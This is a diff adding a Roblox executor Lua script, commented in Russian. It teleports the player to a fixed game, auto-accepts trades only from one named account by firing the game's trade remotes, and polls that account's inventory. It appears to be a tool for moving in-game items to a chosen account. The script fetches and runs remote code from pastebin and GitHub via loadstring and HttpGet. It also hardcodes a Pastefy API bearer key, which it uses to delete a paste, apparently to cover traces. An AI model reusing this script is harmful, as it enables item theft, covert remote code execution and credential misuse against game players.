@@ -1,0 +1,245 @@
+_G.gg = _G.gg or false
+if _G.gg then
+    print("already")
+    return
+end
+_G.gg = true
+repeat wait() until game:IsLoaded()
+repeat wait() until game.Players.LocalPlayer:FindFirstChild("PlayerGui") and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
+function WaitForPath(parent, path)
+    local current = parent
+    for _, name in ipairs(path) do
+        current = current:WaitForChild(name)
+    end
+    return current
+end
+
+function missing(t, f, fallback)
+    if type(f) == t then return f end
+    return fallback
+end
+
+queueteleport =  missing("function", queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport))
+
+game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, game.JobId)
+local path = {"MainGUI", "Game", "Crafting", "Inventory", "Salvage", "ScrollFrame", "Container"}
+local container = WaitForPath(game.Players.LocalPlayer:WaitForChild("PlayerGui"), path)
+print("Container загружен:", container)
+print("PlayerGui и Humanoid загружены!")
+
+local targetName = getgenv().name
+
+game:GetService("ReplicatedStorage").Trade.UpdateTrade.OnClientEvent:Connect(function(args)
+    lastOfferTime = args.LastOffer
+end)
+
+-- Получаем сервисы
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+local TradeRemote = ReplicatedStorage:WaitForChild("Trade")
+local playerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+local tradegui = playerGui:WaitForChild("TradeGUI")
+local container = tradegui:WaitForChild("Container")
+-- Получаем кнопки
+local actions = container:WaitForChild("Trade"):WaitForChild("Actions")
+local acceptcon = actions:WaitForChild("Accept")
+-- Получаем TradeRequest GUI
+local tradeRequest = LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard.Container:WaitForChild("TradeRequest")
+
+tradeRequest:GetPropertyChangedSignal("Visible"):Connect(function()
+    if tradeRequest.Visible then
+        local usernameLabel = tradeRequest:FindFirstChild("ReceivingRequest") and tradeRequest.ReceivingRequest:FindFirstChild("Username")
+        if usernameLabel then
+            -- Если текст уже корректный и наш доверенный игрок
+            if usernameLabel.Text == targetName then
+                handleTrade(usernameLabel.Text)
+            elseif usernameLabel.Text == "Nikilis" then
+                -- Ждём, пока текст сменится на реального игрока
+                local conn
+                conn = usernameLabel:GetPropertyChangedSignal("Text"):Connect(function()
+                    if usernameLabel.Text ~= "Nikilis" then
+                        conn:Disconnect()
+                        if usernameLabel.Text == targetName then
+                            handleTrade(usernameLabel.Text)
+                        else
+                            print("Трейд от недоверенного игрока:", usernameLabel.Text)
+                        end
+                    end
+                end)
+            else
+                -- Трейд от недоверенного игрока
+                print("Трейд от недоверенного игрока:", usernameLabel.Text)
+            end
+        end
+    end
+end)
+
+
+tradegui:GetPropertyChangedSignal("Enabled"):Connect(function()
+    if tradegui.Enabled then
+        local firstSlot = LocalPlayer.PlayerGui.TradeGUI.Container.Trade.TheirOffer.Container.NewItem1
+        repeat
+            wait(0.7)
+            if not tradegui.Enabled then
+                print("трейд закрылся в логике офера")
+                return
+            end
+        until firstSlot.Visible
+
+        local cooldown = acceptcon:WaitForChild("Cooldown")
+
+        repeat
+            wait(0.5)
+            if not tradegui.Enabled then
+                print("трейд закрылся в логике кулдавна")
+                return
+            end
+        until not cooldown.Visible
+
+        print("cool")
+        game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOfferTime)
+    else
+        print("трейд гай закрылся")
+    end
+end)
+local HttpService = game:GetService("HttpService")
+
+local apiKey = "FsTgs7lxObDHAOFZXRgkeO8nYOARMaJjPsInJKi59PysbJGBTPFRzCmnrna2"
+
+local deleteUrl = "https://pastefy.app/api/v2/paste/" .. getgenv().paste
+
+local headers = {
+    Accept = "application/json",
+    ["Content-Type"] = "application/json",
+    ["Authorization"] = "Bearer " .. apiKey,
+}
+
+local function deletePaste()
+    local req = {
+        Url = deleteUrl,
+        Method = "DELETE",
+        Headers = headers,
+    }
+
+    local response = request(req)
+
+    -- базовая проверка на наличие ответа
+    if not response then 
+        return false, "No response from request()"
+    end
+
+    -- логируем статус для дебага
+    print(("HTTP %s %s"):format(response.StatusCode or "?", response.StatusMessage or ""))
+
+    -- парсим тело ответа
+    local parsed = nil
+    if response.Body and response.Body ~= "" then
+        local ok, res = pcall(function() 
+            return HttpService:JSONDecode(response.Body)
+        end)
+        if ok then
+            parsed = res
+        else
+            return false, ("Invalid JSON in response body: %s"):format(tostring(response.Body))
+        end
+    end
+
+    -- проверяем успех удаления
+    if parsed and parsed.success then
+        print("Paste успешно удалена!")
+        return true, parsed
+    end
+
+    -- иногда код 200/204 без parsed — считаем успехом
+    if response.StatusCode == 200 or response.StatusCode == 204 then
+        return true, parsed
+    end
+
+    -- неуспешный ответ
+    local err = {
+        status = response.StatusCode,
+        statusMessage = response.StatusMessage,
+        body = response.Body,
+        successFlag = parsed and parsed.success or nil
+    }
+    return false, err
+end
+
+-- Функция для обработки трейда
+function handleTrade(requesterName)
+    local args = {}
+    if requesterName == targetName then
+        -- Наш игрок, принимаем трейд
+        if TradeRemote:FindFirstChild("AcceptRequest") then
+            TradeRemote.AcceptRequest:FireServer(unpack(args))
+            print("Принят трейд от " .. requesterName)
+        end
+    else
+        -- Не наш игрок, отклоняем трейд
+        if TradeRemote:FindFirstChild("DeclineRequest") then
+            TradeRemote.DeclineRequest:FireServer(unpack(args))
+            print("Отклонен трейд от " .. requesterName)
+        end
+    end
+end
+
+game.Players.LocalPlayer.OnTeleport:Connect(function()
+    if queueteleport then
+        queueteleport("loadstring(game:HttpGet('https://pastebin.com/raw/bqmNR0vc',true))()")
+    else
+        print("queue нету")
+    end
+end)
+
+-- Функция проверки
+local function checkPlayer()
+    print("слушаем1111")
+    local targetPlayer = Players:FindFirstChild(targetName)
+
+    if targetPlayer then
+        print(targetName .. " найден в игре!")
+    else
+        print(targetName .. " не найден, вас кикают!")
+        if LocalPlayer then
+            print("Игрок " .. targetName .. " не найден в игре!")
+            deletePaste()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/veil0x14/LocalScripts/refs/heads/main/pg.lua"))()
+            return
+        end
+    end
+end
+local function checkInventory()
+    local args = { [1] = targetName }
+
+    local success, result = pcall(function()
+        return ReplicatedStorage:WaitForChild("Remotes")
+            :WaitForChild("Extras")
+            :WaitForChild("GetFullInventory")
+            :InvokeServer(unpack(args))
+    end)
+
+    if success and result then
+        local weapons = result.Weapons or {}
+        local owned = weapons.Owned or {}
+
+        if next(owned) == nil then
+            deletePaste()
+            print("все пусто нахуй!")
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/veil0x14/LocalScripts/refs/heads/main/pg.lua"))()
+            return
+        else
+            print("Игрок имеет оружие!")
+        end
+    else
+        warn("Не удалось получить инвентарь:", result)
+    end
+end
+print("Скрипт загружен")
+
+while true do
+    checkPlayer()
+    checkInventory()
+    wait(2)
+end
